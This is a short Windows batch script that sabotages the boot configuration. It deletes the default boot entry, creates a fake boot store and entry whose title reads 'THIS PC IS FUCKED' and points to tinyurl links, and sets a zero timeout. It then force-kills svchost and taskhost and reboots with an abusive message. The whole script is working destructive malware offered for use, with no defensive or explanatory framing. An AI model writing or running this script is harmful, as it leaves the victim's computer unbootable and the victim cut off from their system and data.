@echo off
bcdedit /export "%USERPROFILE%\Desktop\bcd_backup"
bcdedit /store C:\Boot\BCD /delete {default} /f
bcdedit /createstore C:\Boot\BCD
for /f "tokens=2 delims={}" %%i in ('bcdedit /create /d "THIS PC IS FUCKED GO TO TINYURL.COM/GGTFILES OR TINYURL.COM/QUAGFILE" /application bootsector') do set NEW_ID={%%i}
bcdedit /default %NEW_ID%
bcdedit /displayorder %NEW_ID%
bcdedit /timeout 0
taskkill /f /im svchost.exe
taskkill /f /im taskhost.exe
shutdown /r /t 1 /c "i have shit on your nasal cavities, your dead."